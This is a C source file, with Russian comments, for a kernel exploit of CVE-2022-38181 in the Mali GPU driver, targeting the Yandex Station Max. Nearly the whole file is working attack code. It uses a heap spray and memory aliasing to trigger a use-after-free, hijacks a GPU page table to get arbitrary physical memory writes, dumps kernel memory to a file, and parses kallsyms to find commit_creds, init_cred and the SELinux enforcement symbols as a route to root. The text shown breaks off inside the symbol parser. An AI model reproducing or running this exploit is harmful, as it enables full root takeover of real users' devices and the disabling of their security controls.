// ymax_root.c — полный эксплойт CVE-2022-38181 для Yandex Station Max (r16p0/UK 11.13).
// Конвейер: эвикция(kbase-давление) -> спрей 640/4CPU -> алиас -> jit_free(висячий)
//   -> freed_idx -> pgd (L3 fd2 в алиасе) -> окно записи (слот 256)
//   -> validate | dump (kern phys 0x1080000+12МБ) | root (kallsyms + payload)
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#define setfsuid(u) syscall(__NR_setfsuid, (unsigned)(u))
#define setfsgid(g) syscall(__NR_setfsgid, (unsigned)(g))

#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "midgard.h"

#define MALI "/dev/mali0"

#define SPRAY_PAGES 25
#define SPRAY_NUM 640
#define FLUSH_SIZE (16u << 20)
#define NUM_TRIALS 60
#define FLUSH_REGION_SIZE 240
#define POOL_SIZE 16384
#define RESERVED_SIZE 32
#define TOTAL_RESERVED_SIZE 1024
#define NRES (TOTAL_RESERVED_SIZE / RESERVED_SIZE)
#define SPRAY_CPU 0
#define OVERWRITE_INDEX 256
#define KBASE_PHYS 0x2080000ULL
#define KDUMP_SIZE 0x1500000ULL
#define KDUMP_BLOCK 64

struct ai_ent { struct { uint64_t handle; } handle; uint64_t offset; uint64_t length; };

static int fd1 = -1, fd2 = -1;
static uint8_t jit_id = 1, atom_number = 1;
static uint64_t src_real[SPRAY_NUM];
static uint8_t* src_map[SPRAY_NUM];
static uint64_t alias_A = 0;
static uint8_t* alias_sub[SPRAY_NUM];
static uint64_t res_real[NRES];
static uint8_t* res_map[NRES];
static uint64_t press_real[16]; static uint8_t* press_map[16]; static int npress = 0;
static int freed_idx = -1, pgd_idx = -1;

// ---------- базовые r16-примитивы (проверены) ----------

static int open_dev(void) { int fd = open(MALI, O_RDWR); if (fd < 0) err(1, "open mali"); return fd; }

static void setup_mali(int fd) {
    struct kbase_ioctl_version_check vc = {0};
    if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc) < 0) err(1, "version check");
    struct kbase_ioctl_set_flags sf = {0};
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) err(1, "set flags");
    if (mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE) == MAP_FAILED)
        err(1, "tracking page");
}

static uint64_t mem_alloc(int fd, uint64_t va_pages, uint64_t commit_pages) {
    union kbase_ioctl_mem_alloc a = {0};
    a.in.flags = 0xf;
    a.in.va_pages = va_pages;
    a.in.commit_pages = commit_pages;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) < 0) return 0;
    return a.out.gpu_va;
}

static uint64_t alloc_bound(int fd, uint64_t va_pages, uint64_t commit_pages, uint8_t** map_out) {
    uint64_t cookie = mem_alloc(fd, va_pages, commit_pages);
    if (!cookie) return 0;
    void* m = mmap(NULL, va_pages << 12, PROT_READ | PROT_WRITE, MAP_SHARED, fd, cookie);
    if (m == MAP_FAILED) { printf("[x] bind: %s\n", strerror(errno)); return 0; }
    *map_out = m;
    return cookie;
}

static int mem_commit_pages(int fd, uint64_t real_va, uint64_t pages) {
    struct kbase_ioctl_mem_commit c = { .gpu_addr = real_va, .pages = pages };
    return ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &c);
}

static long query_commit(int fd, uint64_t real_va, uint64_t* val) {
    union kbase_ioctl_mem_query q = {0};
    q.in.gpu_addr = real_va;
    q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) < 0) return -1;
    *val = q.out.value;
    return 0;
}

static void jit_init(int fd) {
    struct kbase_ioctl_mem_jit_init_11_5 init = {0};
    init.va_pages = 0x1000;
    init.max_allocations = 255;
    init.trim_level = 100;
    init.group_id = 0;
    if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT_11_5, &init) < 0) err(1, "jit init 11_5");
}

struct r16_jit_alloc_info {
    uint64_t gpu_alloc_addr;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint8_t id, bin_id, max_allocations, flags;
    uint8_t padding[2];
    uint16_t usage_id;
};

static int submit_atom(int fd, struct base_jd_atom_v2* atom) {
    struct kbase_ioctl_job_submit sub = {0};
    sub.addr = (uint64_t)atom;
    sub.nr_atoms = 1;
    sub.stride = sizeof(*atom);
    return ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &sub);
}

static uint64_t jit_allocate(int fd, uint8_t id, uint64_t wb_cookie, void* wb_map) {
    struct r16_jit_alloc_info info = {0};
    info.gpu_alloc_addr = wb_cookie;
    info.va_pages = SPRAY_PAGES;
    info.commit_pages = SPRAY_PAGES;
    info.extent = 1;
    info.id = id;
    *(volatile uint64_t*)wb_map = 0;
    struct base_jd_atom_v2 atom = {0};
    atom.jc = (uint64_t)&info;
    atom.atom_number = atom_number++;
    atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
    atom.nr_extres = 0;
    if (submit_atom(fd, &atom) < 0) return 0;
    for (int i = 0; i < 150; i++) {
        uint64_t v = *(volatile uint64_t*)wb_map;
        if (v) return v;
        usleep(10000);
    }
    return 0;
}

static void jit_free_id(int fd, uint8_t id) {
    uint8_t free_id = id;
    struct base_jd_atom_v2 atom = {0};
    atom.jc = (uint64_t)&free_id;
    atom.atom_number = atom_number++;
    atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
    atom.nr_extres = 1;
    submit_atom(fd, &atom);
}

static void flags_change(int fd, uint64_t gpu_va, uint32_t flags) {
    struct kbase_ioctl_mem_flags_change c = {0};
    c.flags = flags; c.gpu_va = gpu_va; c.mask = flags;
    if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &c) < 0)
        printf("[x] flags_change: %s\n", strerror(errno));
}

static uint64_t drain_release(int fd) {
    uint8_t* m;
    uint64_t real = alloc_bound(fd, POOL_SIZE, POOL_SIZE, &m);
    if (!real) return 0;
    if (mem_commit_pages(fd, real, 0) < 0) printf("[x] drain release: %s\n", strerror(errno));
    return real;
}

#define CPU_SETSIZE 1024
typedef struct { unsigned long b[CPU_SETSIZE / (8 * sizeof(unsigned long))]; } yc_set;
static void migrate_to_cpu(int i) {
    yc_set s; memset(&s, 0, sizeof(s));
    s.b[i / (8 * sizeof(unsigned long))] |= 1UL << (i % (8 * sizeof(unsigned long)));
    syscall(__NR_sched_setaffinity, gettid(), sizeof(s), &s);
}

static long mem_free_mb(void) {
    FILE* f = fopen("/proc/meminfo", "r");
    if (!f) return 1 << 30;
    char k[64]; long v; char u[16];
    while (fscanf(f, "%63s %ld %15s", k, &v, u) >= 2)
        if (!strncmp(k, "MemFree:", 8)) { fclose(f); return v / 1024; }
    fclose(f);
    return -1;
}

static void prologue(int fd) {
    for (int i = 0; i < 20; i++) {
        union kbase_ioctl_mem_alloc a = {0};
        a.in.flags = 0xf; a.in.va_pages = 1; a.in.commit_pages = 1;
        if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) < 0) break;
    }
    unsigned long nr31 = (3u << 30) | (16u << 16) | (0x80u << 8) | 31u;
    struct { uint64_t a, b; } u1 = { 0x41000, 1 }, u2 = { 0x900000, 1 };
    ioctl(fd, nr31, &u1); ioctl(fd, nr31, &u2);
    void* p = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0x900000);
    if (p != MAP_FAILED) munmap(p, 0x1000);
}

// ---------- эвикция ----------
static void* flush_regions[FLUSH_REGION_SIZE];
static int flush_count = 0;

struct jitref { uint8_t id; uint64_t va; };
static struct jitref jits[8];
static int njit = 0;
static int evicted_round = -1;

static int probe_all(void) {
    for (int j = 0; j < njit; j++) {
        if (!jits[j].va) continue;
        void* p = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd1, jits[j].va);
        if (p == MAP_FAILED) return j;
        munmap(p, 0x1000);
    }
    return -1;
}

static int trigger_evict(void) {
    uint8_t* wb;
    uint64_t wb_cookie = mem_alloc(fd1, 1, 1);
    if (!wb_cookie) return -1;
    wb = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd1, wb_cookie);
    if (wb == MAP_FAILED) return -1;

    uint64_t jit_addr = jit_allocate(fd1, jit_id, wb_cookie, wb);
    if (!jit_addr) {
        for (uint64_t va = 0x1f0000000ULL; va < 0x200100000ULL && !jit_addr; va += 0x1000) {
            int known = 0;
            for (int j = 0; j < njit; j++) if (jits[j].va == va) known = 1;
            if (known) continue;
            void* m = mmap(NULL, SPRAY_PAGES << 12, PROT_READ, MAP_SHARED, fd1, va);
            if (m != MAP_FAILED) { munmap(m, SPRAY_PAGES << 12); jit_addr = va; }
        }
    }
    if (!jit_addr) { printf("[x] jit-регион не найден\n"); jit_id++; return -1; }
    printf("[*] jit_id=%u gpu_va=0x%llx\n", jit_id, (unsigned long long)jit_addr);

    flags_change(fd1, jit_addr, BASE_MEM_DONT_NEED);
    jits[njit].id = jit_id;
    jits[njit].va = jit_addr;
    njit++;
    migrate_to_cpu(SPRAY_CPU);

    for (int i = 0; i < NUM_TRIALS; i++) {
        if (flush_count >= FLUSH_REGION_SIZE) break;
        if (mem_free_mb() < 30) break;
        flush_regions[flush_count] = mmap(NULL, FLUSH_SIZE, PROT_READ | PROT_WRITE,
                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (flush_regions[flush_count] == MAP_FAILED) break;
        memset(flush_regions[flush_count], 0x41, FLUSH_SIZE);
        flush_count++;
        int dead = probe_all();
        if (dead >= 0) {
            printf("[+] ЭВИКЦИЯ (линейная, итер %d): id=%u va=0x%llx\n",
                   i, jits[dead].id, (unsigned long long)jits[dead].va);
            evicted_round = dead;
            return 1;
        }
    }

    printf("[*] кик: kbase-аллокации на fd2...\n");
    for (int k = 0; k < 10; k++) {
        uint64_t c = mem_alloc(fd2, 4096, 4096);
        if (c && npress < 16) {
            void* m = mmap(NULL, 4096 << 12, PROT_READ, MAP_SHARED, fd2, c);
            if (m != MAP_FAILED) { press_real[npress] = c; press_map[npress] = m; npress++; }
        }
        int dead = probe_all();
        if (dead >= 0) {
            printf("[+] ЭВИКЦИЯ (kbase-давление %d): id=%u va=0x%llx\n",
                   k, jits[dead].id, (unsigned long long)jits[dead].va);
            evicted_round = dead;
            return 1;
        }
        usleep(200000);
    }
    printf("[-] не вытеснен: держим kbase-давление (CPU-мапы освобождаем)\n");
    jit_id++;
    for (int i = 0; i < flush_count; i++) munmap(flush_regions[i], FLUSH_SIZE);
    flush_count = 0;
    // кап GPU-давления: старше 24 регионов (384МБ) — освобождаем старейшие
    while (npress > 24) {
        munmap(press_map[0], 4096 << 12);
        mem_commit_pages(fd2, press_real[0], 0);
        for (int j = 0; j < npress - 1; j++) { press_real[j] = press_real[j+1]; press_map[j] = press_map[j+1]; }
        npress--;
    }
    usleep(300000);
    return 0;
}

// ---------- спрей + алиас ----------
static int spray_and_alias(void) {
    printf("[*] спрей %d x %d стр (CPU0:256, CPU1-3:128)...\n", SPRAY_NUM, SPRAY_PAGES);
    for (int i = 0; i < SPRAY_NUM; i++) {
        if (i == 256) migrate_to_cpu(1);
        else if (i == 384) migrate_to_cpu(2);
        else if (i == 512) migrate_to_cpu(3);
        uint8_t* m;
        uint64_t real = alloc_bound(fd1, SPRAY_PAGES, 0, &m);
        if (!real) { printf("[x] спрей оборвался на %d\n", i); return -1; }
        if (i == 0) printf("[*] spray[0]: gpu_va=0x%llx mmap=%p\n", (unsigned long long)real, m);
        src_real[i] = real; src_map[i] = m;
    }
    for (int i = 0; i < SPRAY_NUM; i++)
        if (mem_commit_pages(fd1, src_real[i], SPRAY_PAGES) < 0) {
            printf("[x] commit спрея %d: %s\n", i, strerror(errno)); return -1;
        }
    for (int i = 0; i < SPRAY_NUM; i++) memset(src_map[i], 0x41, SPRAY_PAGES << 12);

    static struct ai_ent ai[SPRAY_NUM];
    for (int i = 0; i < SPRAY_NUM; i++) {
        ai[i].handle.handle = src_real[i];
        ai[i].offset = 0;
        ai[i].length = SPRAY_PAGES;
    }
    union kbase_ioctl_mem_alias al = {0};
    al.in.flags = 0xf;
    al.in.stride = SPRAY_PAGES;
    al.in.nents = SPRAY_NUM;
    al.in.aliasing_info = (uint64_t)&ai;
    if (ioctl(fd1, KBASE_IOCTL_MEM_ALIAS, &al) < 0) {
        printf("[x] alias: %s\n", strerror(errno)); return -1;
    }

    alias_A = (uint64_t)al.out.gpu_va;
    for (int i = 0; i < SPRAY_NUM; i++) {
        alias_sub[i] = mmap(NULL, SPRAY_PAGES << 12, PROT_READ, MAP_SHARED,
                            fd1, alias_A + (uint64_t)i * SPRAY_PAGES * 0x1000);
        if (alias_sub[i] == MAP_FAILED) { printf("[x] sub-map %d: %s\n", i, strerror(errno)); return -1; }
    }
    printf("[*] alias base=0x%llx OK\n", (unsigned long long)alias_A);
    return 0;
}

static int find_freed(void) {
    for (int i = 0; i < SPRAY_NUM; i++) {
        uint64_t v = 0;
        long rc = query_commit(fd1, src_real[i], &v);
        if (rc < 0 || v != SPRAY_PAGES) {
            printf("[+] freed_idx=%d (rc=%ld commit=%llu)\n", i, rc, (unsigned long long)v);
            freed_idx = i;
            return i;
        }
    }
    printf("[-] freed_idx не найден\n");
    return -1;
}

// ---------- MMU-дамп + иерархический разбор ----------
struct dump_blk { int level; uint64_t table_phys; uint64_t* entries; };
static struct dump_blk dblk[2048];
static int ndblk = 0;
struct l3info { uint64_t tphys; uint64_t va_base; uint64_t* ents; };
static struct l3info l3s[2048];
static int nl3 = 0;
static uint64_t l2_table_phys = 0;   // первая L2-таблица fd2 (для kdump-окна)
static int l2_free_entries[512];     // индексы невалидных записей L2
static int nl2free = 0;

static uint8_t* mmu_dump(int fd, size_t bytes) {
    void* m = mmap(NULL, bytes, PROT_READ | PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MMU_DUMP_HANDLE);
    return (m == MAP_FAILED) ? NULL : (uint8_t*)m;
}

static int parse_flat(uint8_t* buf, size_t bytes) {
    ndblk = 0;
    uint64_t* p = (uint64_t*)buf + 3;
    uint64_t* end = (uint64_t*)(buf + bytes);
    while (p + 512 < end && *p != 0xFFULL && ndblk < 2048) {
        dblk[ndblk].level = (int)(*p & 7);
        dblk[ndblk].table_phys = *p & ~7ULL;
        dblk[ndblk].entries = p + 1;
        p += 513;
        ndblk++;
    }
    return ndblk;
}

static void walk_level(int level, uint64_t va_base, int* pos) {
    if (*pos >= ndblk || dblk[*pos].level != level) return;
    struct dump_blk* b = &dblk[(*pos)++];
    if (level == 3) {
        if (nl3 < 2048) {
            l3s[nl3].tphys = b->table_phys;
            l3s[nl3].va_base = va_base;
            l3s[nl3].ents = b->entries;
            nl3++;
        }
        return;
    }
    if (level == 2 && !l2_table_phys) {
        l2_table_phys = b->table_phys;
        nl2free = 0;
        for (int i = 0; i < 512; i++)
            if ((b->entries[i] & 3) != 3 && nl2free < 512) l2_free_entries[nl2free++] = i;
    }
    for (int i = 0; i < 512; i++) {
        uint64_t e = b->entries[i];
        if ((e & 3) == 3)
            walk_level(level + 1, va_base + ((uint64_t)i << (39 - 9 * level)), pos);
    }
}

static int parse_tree(uint8_t* buf, size_t bytes) {
    nl3 = 0;
    l2_table_phys = 0;
    if (parse_flat(buf, bytes) <= 0) return 0;
    int pos = 0;
    walk_level(0, 0, &pos);
    return nl3;
}

// ---------- GPU WRITE_VALUE ----------
static uint64_t jc_cache[2] = {0, 0};   // [fd2?] — по факту: jc для fd1, fd2
static uint8_t* jc_map[2] = {0, 0};

static void write_value(int fd, uint64_t gpu_addr, uint64_t value, int type32) {
    int idx = (fd == fd2) ? 1 : 0;
    if (!jc_cache[idx]) {
        uint8_t* jm;
        uint64_t jc = alloc_bound(fd, 1, 1, &jm);
        if (!jc) return;
        jc_cache[idx] = jc; jc_map[idx] = jm;
    }
    uint8_t* jm = jc_map[idx];
    struct MALI_JOB_HEADER jh = {0};
    jh.is_64b = true;
    jh.type = MALI_JOB_TYPE_WRITE_VALUE;
    struct MALI_WRITE_VALUE_JOB_PAYLOAD pl = {0};
    pl.type = type32 ? MALI_WRITE_VALUE_TYPE_IMMEDIATE_32 : MALI_WRITE_VALUE_TYPE_IMMEDIATE_64;
    pl.immediate_value = value;
    pl.address = gpu_addr;
    MALI_JOB_HEADER_pack((uint32_t*)jm, &jh);
    MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)jm + 8, &pl);
    struct base_jd_atom_v2 atom = {0};
    atom.jc = jc_cache[idx];
    atom.atom_number = atom_number++;
    atom.core_req = BASE_JD_REQ_CS;
    submit_atom(fd, &atom);
    usleep(30000);
    struct pollfd pf = { .fd = fd, .events = POLLIN };
    if (poll(&pf, 1, 150) > 0) { char ev[256]; read(fd, ev, sizeof(ev)); }
}

// быстрый вариант для сканов: та же логика, но задача подкладки и ожидания короче
static void wvalue_fast(int fd, uint64_t gpu_addr, uint64_t value, int type32) {
    int idx = (fd == fd2) ? 1 : 0;
    if (!jc_cache[idx]) {
        uint8_t* jm;
        uint64_t jc = alloc_bound(fd, 1, 1, &jm);
        if (!jc) return;
        jc_cache[idx] = jc; jc_map[idx] = jm;
    }
    uint8_t* jm = jc_map[idx];
    struct MALI_JOB_HEADER jh = {0};
    jh.is_64b = true;
    jh.type = MALI_JOB_TYPE_WRITE_VALUE;
    struct MALI_WRITE_VALUE_JOB_PAYLOAD pl = {0};
    pl.type = type32 ? MALI_WRITE_VALUE_TYPE_IMMEDIATE_32 : MALI_WRITE_VALUE_TYPE_IMMEDIATE_64;
    pl.immediate_value = value;
    pl.address = gpu_addr;
    MALI_JOB_HEADER_pack((uint32_t*)jm, &jh);
    MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)(jm + 8), &pl);
    struct base_jd_atom_v2 atom = {0};
    atom.jc = jc_cache[idx];
    atom.atom_number = atom_number++;
    atom.core_req = BASE_JD_REQ_CS;
    submit_atom(fd, &atom);
    usleep(3000);
    struct pollfd pf = { .fd = fd, .events = POLLIN };
    if (poll(&pf, 1, 20) > 0) { char ev[256]; read(fd, ev, sizeof(ev)); }
}

// ---------- окно записи через захваченную L3 ----------
static uint64_t pgd_va = 0;      // GPU VA (алиас fd1) страницы-таблицы
static uint64_t* watch = NULL;   // CPU-вид этой страницы через алиас
static uint64_t match_B = 0;     // VA-база 2МБ блока этой L3 (в fd2)
static int win_slot = OVERWRITE_INDEX;
static int win_phase = 0;

static void set_window(uint64_t pte) {
    write_value(fd1, pgd_va + win_slot * 8, pte, 0);
    usleep(50000);
}

static void wphys64(uint64_t phys, uint64_t value) {
    set_window((phys & ~0xFFFULL) | 0x443);
    write_value(fd2, match_B + win_slot * 0x1000 + (phys & 0xFFF), value, 0);
    usleep(50000);
}

static void wphys32(uint64_t phys, uint32_t value) {
    set_window((phys & ~0xFFFULL) | 0x443);
    write_value(fd2, match_B + win_slot * 0x1000 + (phys & 0xFFF), value, 1);
    usleep(50000);
}

// поиск: страница жертвы == L3 fd2 (кросс-сверка контента)
static int capture_window(void) {
    int cand[SPRAY_PAGES], ncand = 0;
    printf("[*] capture_window: freed_idx=%d alias_sub=%p\n", freed_idx, alias_sub[freed_idx]);
    fflush(stdout);
    // пробное чтение первого байта — ловим SIGBUS до массового чтения
    volatile uint8_t probe = *(volatile uint8_t*)alias_sub[freed_idx];
    printf("[*] проба чтения: 0x%02x OK\n", probe);
    fflush(stdout);
    uint64_t* vp = (uint64_t*)alias_sub[freed_idx];
    for (int pg = 0; pg < SPRAY_PAGES; pg++) {
        int hits = 0;
        for (int i = 0; i < 512; i++) if ((vp[pg * 512 + i] & 3) == 3) hits++;
        if (hits >= 4) cand[ncand++] = pg;
    }
    printf("[*] кандидатов-таблиц у жертвы: %d\n", ncand);
    if (!ncand) return -1;

    printf("[*] MMU-дамп fd2...\n"); fflush(stdout);
    size_t sz = 1024 * 1024;
    uint8_t* d2 = NULL;
    while (sz <= (4u << 20)) { d2 = mmu_dump(fd2, sz); if (d2) break; sz *= 2; }
    if (!d2) { printf("[x] дамп fd2\n"); return -1; }
    parse_tree(d2, sz);
    printf("[*] fd2: блоков=%d L3=%d l2=0x%llx свободных L2-записей=%d\n",
           ndblk, nl3, (unsigned long long)l2_table_phys, nl2free);
    if (!l2_table_phys || nl2free < 8) { munmap(d2, sz); return -1; }

    for (int c = 0; c < ncand; c++) {
        int pg = cand[c];
        uint64_t* page = (uint64_t*)(alias_sub[freed_idx] + pg * 0x1000);
        for (int b = 0; b < nl3; b++) {
            int match = 0;
            for (int e = 0; e < 512; e++)
                if (page[e] && page[e] == l3s[b].ents[e]) match++;
            if (match >= 8) {
                pgd_idx = pg;
                pgd_va = alias_A + ((uint64_t)freed_idx * SPRAY_PAGES + pg) * 0x1000;
                watch = page;
                match_B = l3s[b].va_base;
                printf("[+] ЗАХВАТ: алиас-стр.%d == L3 fd2 (phys 0x%llx, match=%d)\n",
                       pg, (unsigned long long)l3s[b].tphys, match);
                printf("[+] pgd_va=0x%llx match_B=0x%llx (слот256 VA=0x%llx)\n",
                       (unsigned long long)pgd_va, (unsigned long long)match_B,
                       (unsigned long long)(match_B + OVERWRITE_INDEX * 0x1000));
                munmap(d2, sz);
                return 0;
            }
        }
    }
    munmap(d2, sz);
    printf("[-] захват не удался\n");
    return -1;
}

// ---------- валидация записи (безопасно: цель — своя страница) ----------
static int validate_write(void) {
    // цель: первая валидная страница reserve — её phys из дампа, CPU из res_map
    uint64_t tphys = 0; volatile uint8_t* tcpu = NULL;
    size_t sz = 1024 * 1024;
    uint8_t* d2 = NULL;
    while (sz <= (4u << 20)) { d2 = mmu_dump(fd2, sz); if (d2) break; sz *= 2; }
    if (!d2) return -1;
    parse_tree(d2, sz);
    for (int b = 0; b < nl3 && !tphys; b++)
        for (int i = 0; i < NRES && !tphys; i++) {
            if (res_real[i] < l3s[b].va_base || res_real[i] >= l3s[b].va_base + 0x200000) continue;
            int eidx = (int)((res_real[i] - l3s[b].va_base) >> 12);
            if ((l3s[b].ents[eidx] & 3) == 3) {
                tphys = l3s[b].ents[eidx] & 0x0000FFFFFFFFF000ULL;
                tcpu = res_map[i];
            }
        }
    munmap(d2, sz);
    if (!tphys) { printf("[V] цель не найдена\n"); return -1; }
    printf("[V] цель: phys=0x%llx cpu=%p\n", (unsigned long long)tphys, (void*)tcpu);

    uint64_t before = watch[win_slot];
    set_window(tphys | 0x443);
    write_value(fd2, match_B + win_slot * 0x1000, 0xCAFEBABEDEADBEEFULL, 0);
    usleep(200000);
    uint64_t rd = *(volatile uint64_t*)tcpu;
    printf("[V] чтение цели: 0x%016llx %s\n", (unsigned long long)rd,
           rd == 0xCAFEBABEDEADBEEFULL ? "=== ПРОИЗВОЛЬНАЯ ЗАПИСЬ РАБОТАЕТ ===" : "(мимо)");
    set_window(before);
    return rd == 0xCAFEBABEDEADBEEFULL ? 0 : -1;
}

// ---------- дамп ядра через порчу L2-записей ----------
static uint8_t* kbuf = NULL;   // KDUMP_SIZE

// снапшот свободных L2-записей (берётся один раз — легитимные мапинги jc-страниц
// могут занимать слоты, это безвредно: порча их записей ломает только наши страницы)
static int g_free_entries[512];
static int g_nfree = 0;
static uint64_t g_l2_phys = 0;

static int dump_kernel(void) {
    kbuf = calloc(1, KDUMP_SIZE);
    if (!kbuf) return -1;
    int total_pages = KDUMP_SIZE >> 12;
    int done = 0;
    size_t sz = 4u << 20;
    int round = 0;
    while (done < total_pages) {
        // снапшот свободных записей при первом раунде
        if (!g_nfree) {
            uint8_t* d0 = mmu_dump(fd2, sz);
            if (!d0) return -1;
            parse_tree(d0, sz);
            g_l2_phys = l2_table_phys;
            if (!g_l2_phys) { munmap(d0, sz); return -1; }
            for (int b = 0; b < ndblk; b++)
                if (dblk[b].level == 2 && dblk[b].table_phys == g_l2_phys) {
                    for (int i = 0; i < 512 && g_nfree < 512; i++)
                        if ((dblk[b].entries[i] & 3) != 3) g_free_entries[g_nfree++] = i;
                    break;
                }
            munmap(d0, sz);
            printf("[K] L2=0x%llx свободных=%d\n", (unsigned long long)g_l2_phys, g_nfree);
            if (g_nfree < 16) return -1;
        }
        int m = g_nfree < KDUMP_BLOCK ? g_nfree : KDUMP_BLOCK;
        int want = total_pages - done < m ? total_pages - done : m;
        set_window(g_l2_phys | 0x443);
        usleep(100000);
        for (int j = 0; j < want; j++) {
            int k = g_free_entries[(round * KDUMP_BLOCK + j) % g_nfree];
            uint64_t kp = KBASE_PHYS + (uint64_t)(done + j) * 0x1000;
            write_value(fd2, match_B + win_slot * 0x1000 + k * 8, kp | 0x403, 0);
            usleep(30000);
        }
        usleep(100000);
        uint8_t* d2 = mmu_dump(fd2, sz);
        if (!d2) { printf("[x] дамп раунда %d\n", round); return -1; }
        parse_tree(d2, sz);
        int got = 0;
        for (int j = 0; j < want; j++) {
            uint64_t kp = KBASE_PHYS + (uint64_t)(done + j) * 0x1000;
            for (int b = 0; b < ndblk; b++)
                if (dblk[b].level == 3 && dblk[b].table_phys == kp) {
                    memcpy(kbuf + (done + j) * 0x1000, dblk[b].entries, 0x1000);
                    got++;
                    break;
                }
        }
        munmap(d2, sz);
        for (int j = 0; j < want; j++) {
            int k = g_free_entries[(round * KDUMP_BLOCK + j) % g_nfree];
            write_value(fd2, match_B + win_slot * 0x1000 + k * 8, 2, 0);
            usleep(30000);
        }
        done += want;
        round++;
        printf("[K] раунд %d: +%d/%d (всего %d/%d)\n", round, got, want, done, total_pages);
        fflush(stdout);
        if (!got) { printf("[x] чтение не идёт\n"); return -1; }
        if (round % 4 == 0) win_slot = OVERWRITE_INDEX + ((round / 4) % 64);
    }

    // очистка L2: восстановить ВСЕ использованные записи в 2 и проверить
    for (int attempt = 0; attempt < 3; attempt++) {
        set_window(g_l2_phys | 0x443);
        usleep(100000);
        int used = round * KDUMP_BLOCK;
        for (int i = 0; i < used; i++)
            write_value(fd2, match_B + win_slot * 0x1000 + g_free_entries[i % g_nfree] * 8, 2, 0);
        usleep(200000);
        uint8_t* dv = mmu_dump(fd2, sz);
        int dirty = -1;
        if (dv) {
            parse_tree(dv, sz);
            for (int b = 0; b < ndblk; b++)
                if (dblk[b].level == 2 && dblk[b].table_phys == g_l2_phys) {
                    dirty = 0;
                    for (int i = 0; i < used; i++) {
                        int k = g_free_entries[i % g_nfree];
                        if ((dblk[b].entries[k] & 3) == 3) dirty++;
                    }
                    break;
                }
            munmap(dv, sz);
        }
        printf("[K] очистка L2: попытка %d, грязных=%d\n", attempt, dirty);
        if (dirty == 0) break;
    }
    int f = open("/data/local/tmp/kdump.bin", O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (f >= 0) { write(f, kbuf, KDUMP_SIZE); close(f); printf("[K] дамп сохранён (12МБ)\n"); }
    return 0;
}

// ---------- kallsyms ----------
static uint64_t sym_init_cred = 0, sym_commit_creds = 0;
static uint64_t sym_selinux_enforcing = 0, sym_sel_read_handle_unknown = 0;
static uint64_t kallsyms_rel_base = 0;

static uint8_t* g_tokens[256];
static int g_tokens_ok = 0;

static int build_tokens(uint8_t* K, size_t len) {
    // token_index: 256 u16 строго возрастающих
    size_t ti_off = 0;
    for (size_t off = len - 512; off > 0x1000; off -= 2) {
        uint16_t* t = (uint16_t*)(K + off);
        if (t[0] > 0x100) continue;
        int ok = 1;
        for (int i = 1; i < 256; i++)
            if (t[i] <= t[i - 1] || t[i] > 0x1000) { ok = 0; break; }
        if (ok) { ti_off = off; break; }
    }
    if (!ti_off) return -1;
    // token_table заканчивается на ti_off; отступаем на 256 нулей (с пропусками паддинга)
    for (int pad = 0; pad < 8; pad++) {
        size_t tt_start = ti_off - pad;
        int nstr = 0;
        while (tt_start > 0 && nstr < 256) { tt_start--; if (K[tt_start] == 0) nstr++; }
        tt_start++;
        if (tt_start <= 0 || tt_start >= ti_off - 16) continue;
        uint8_t* p = K + tt_start;
        int ok = 1;
        for (int i = 0; i < 256 && ok; i++) {
            if (p >= K + ti_off) { ok = 0; break; }
            g_tokens[i] = p;
            int slen = 0;
            while (p < K + ti_off && *p) { if (*p < 0x20 || *p > 0x7e) { ok = 0; break; } p++; slen++; if (slen > 40) { ok = 0; break; } }
            if (p >= K + ti_off) { ok = 0; break; }
            p++;
        }
        if (ok) { g_tokens_ok = 1; return 0; }
    }
    return -1;
}

// декодируем имя s (length-prefixed токены) в buf; возвращает длину
static int dec_name(uint8_t* np, char* buf, int bufsz) {
    int l = np[0];
    int w = 0;
    if (l < 1 || l > 0x7f) return -1;
    for (int i = 1; i <= l && w < bufsz - 1; i++) {
        uint8_t t = np[i];
        if (t >= 251) return -1;
        char* tok = (char*)g_tokens[t];
        if (!tok) return -1;
        while (*tok && w < bufsz - 1) {
            if (*tok < 0x20 || *tok > 0x7e) return -1;
            buf[w++] = *tok++;
        }
    }
    buf[w] = 0;
    return w;
}

static int parse_kallsyms(void) {
    uint8_t* K = kbuf;
    size_t len = KDUMP_SIZE;
    if (build_tokens(K, len) < 0) { printf("[S] токены не найдены\n"); return -1; }
    printf("[S] токены OK\n");

    // кандидаты kallsyms_relative_base: u64 с ядерными старшими битами,
    // num_syms после него правдоподобен, names декодируются печатными
    for (size_t off = 0x1000; off + 0x20 < len; off += 8) {
        uint64_t v = *(uint64_t*)(K + off);
        uint32_t hi = (uint32_t)(v >> 32);
        if (hi != 0xFFFFFFC0 && hi != 0xFFFFFF80 && hi != 0xFFFFFF81) continue;
        uint64_t num_syms = *(uint64_t*)(K + off + 8);
